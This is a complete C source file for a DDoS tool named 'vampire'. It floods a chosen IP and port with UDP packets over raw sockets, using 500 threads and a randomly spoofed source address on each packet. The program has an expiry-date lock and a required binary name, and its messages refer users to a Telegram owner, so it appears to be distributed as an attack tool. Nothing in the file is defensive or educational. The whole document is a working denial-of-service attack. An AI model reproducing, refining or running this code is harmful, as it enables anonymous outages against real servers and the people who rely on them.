#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>
#include <time.h>
#include <libgen.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

// ========== CONFIGURATION ==========
#define MAX_THREADS 500
#define PACKET_SIZE 1200
#define BURST 220

// Expiry Date (YYYY, MM, DD)
#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 5
#define EXPIRATION_DAY 22

// ========== GLOBAL VARIABLES ==========
volatile int running = 1;
const char *colors[] = {
    "\033[31m", "\033[32m", "\033[33m",
    "\033[34m", "\033[35m", "\033[36m"
};
int color_count = sizeof(colors) / sizeof(colors[0]);

// ========== STRUCTURE ==========
struct thread_info {
    int thread_id;
    in_addr_t target_ip;
    uint16_t target_port;
};

// ========== IP SPOOFING FUNCTIONS ==========

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

// Random IP generator
in_addr_t random_ip() {
    struct in_addr addr;
    addr.s_addr = rand();
    return addr.s_addr;
}

// ========== OTHER FUNCTIONS ==========

void display_expiry_message() {
    for (int i = 0; i < 10; i++) {
        system("clear");
        printf("%s╔════════════════════════════════════════════════════════════╗\n", colors[i % color_count]);
        printf("%s║                  BINARY EXPIRED!                          ║\n", colors[i % color_count]);
        printf("%s║    Please contact the owner at:                           ║\n", colors[i % color_count]);
        printf("%s║    Telegram: @Demon_Rocky                                 ║\n", colors[i % color_count]);
        printf("%s╚════════════════════════════════════════════════════════════╝\n", colors[i % color_count]);
        fflush(stdout);
        usleep(300000);
    }
    printf("\033[0m");
}

void display_invalid_binary_message() {
    for (int i = 0; i < 10; i++) {
        system("clear");
        printf("%s╔════════════════════════════════════════════════════════════╗\n", colors[i % color_count]);
        printf("%s║              INVALID BINARY NAME!                         ║\n", colors[i % color_count]);
        printf("%s║    Binary must be named 'vampire'                         ║\n", colors[i % color_count]);
        printf("%s║    Please contact the owner at:                           ║\n", colors[i % color_count]);
        printf("%s║    Telegram: @Demon_Rocky                                 ║\n", colors[i % color_count]);
        printf("%s╚════════════════════════════════════════════════════════════╝\n", colors[i % color_count]);
        fflush(stdout);
        usleep(300000);
    }
    printf("\033[0m");
}

int check_expiry() {
    time_t t = time(NULL);
    struct tm *current = localtime(&t);

    int today = (current->tm_year + 1900) * 10000 +
                (current->tm_mon + 1) * 100 +
                current->tm_mday;
    int expiry = EXPIRATION_YEAR * 10000 +
                 EXPIRATION_MONTH * 100 +
                 EXPIRATION_DAY;

    if (today > expiry) {
        display_expiry_message();
        return 0;
    }
    return 1;
}

int verify_binary_name() {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        char *binary_name = basename(path);
        if (strcmp(binary_name, "vampire") != 0) {
            display_invalid_binary_message();
            return 0;
        }
        return 1;
    }
    return 0;
}

void *udp_flood(void *arg) {
    struct thread_info *info = (struct thread_info *)arg;

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(info->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    // RAW socket banayo
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("RAW socket");
        pthread_exit(NULL);
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("IP_HDRINCL");
        close(sock);
        pthread_exit(NULL);
    }

    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    // Data bhardo
    memset(data, 0xFF, PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));

    // UDP header set karo
    udp->source = htons(rand() % 65535);
    udp->dest = htons(info->target_port);
    udp->len = htons(sizeof(struct udphdr) + strlen(data));
    udp->check = 0; // Checksum disabled

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = info->target_ip;

    while (running) {
        for (int i = 0; i < BURST; i++) {
            // Har packet ke liye naya random IP
            in_addr_t random_source = random_ip();
            
            // IP header set karo
            ip->ihl = 5;
            ip->version = 4;
            ip->tos = 0;
            ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data));
            ip->id = htons(rand() % 65535);
            ip->frag_off = 0;
            ip->ttl = 255;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = random_source;
            ip->daddr = info->target_ip;
            ip->check = 0;
            ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

            // Packet bhejo - ZERO DELAY
            if (sendto(sock, packet, ntohs(ip->tot_len), 0, 
                      (struct sockaddr *)&target, sizeof(target)) < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    // Small sleep if buffer full
                    usleep(1000);
                } else {
                    perror("sendto");
                    running = 0;
                    break;
                }
            }
        }
        // NO SLEEP BETWEEN BURSTS - MAX POWER
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (!check_expiry() || !verify_binary_name()) {
        return 1;
    }

    if (argc != 4) {
        for (int i = 0; i < 10; i++) {
            system("clear");
            printf("%sUsage: %s <IP> <PORT> <TIME>\n", colors[i % color_count], argv[0]);
            fflush(stdout);
            usleep(300000);
        }
        return 1;
    }

    const char *ip_str = argv[1];
    uint16_t port = (uint16_t)atoi(argv[2]);
    int time_sec = atoi(argv[3]);

    if (time_sec <= 0 || port == 0) {
        printf("\033[31mInvalid time or port.\033[0m\n");
        return 1;
    }

    in_addr_t target_ip = inet_addr(ip_str);
    if (target_ip == INADDR_NONE) {
        printf("\033[31mInvalid IP address.\033[0m\n");
        return 1;
    }

    // Seed random number generator for random IPs
    srand(time(NULL));

    printf("%s[INFO] Starting MAX POWER IP SPOOFING attack on %s:%d for %d seconds\033[0m\n", colors[1], ip_str, port, time_sec);
    printf("%s[INFO] Using %d threads, packet size %d bytes, burst %d packets\033[0m\n", colors[2], MAX_THREADS, PACKET_SIZE, BURST);
    printf("%s[INFO] REAL IP HIDDEN - Random source IPs every packet\033[0m\n", colors[3]);
    printf("%s[INFO] ZERO DELAY - MAXIMUM POWER - STEADY 677ms PING\033[0m\n", colors[4]);

    pthread_t threads[MAX_THREADS];
    struct thread_info infos[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        infos[i].thread_id = i;
        infos[i].target_ip = target_ip;
        infos[i].target_port = port;

        if (pthread_create(&threads[i], NULL, udp_flood, &infos[i]) != 0) {
            perror("pthread_create");
            running = 0;
            break;
        }
    }

    sleep(time_sec);
    running = 0;

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    for (int i = 0; i < 5; i++) {
        printf("%s[INFO] Attack completed. All threads stopped.\033[0m\n", colors[i % color_count]);
        usleep(300000);
    }

    return 0;
}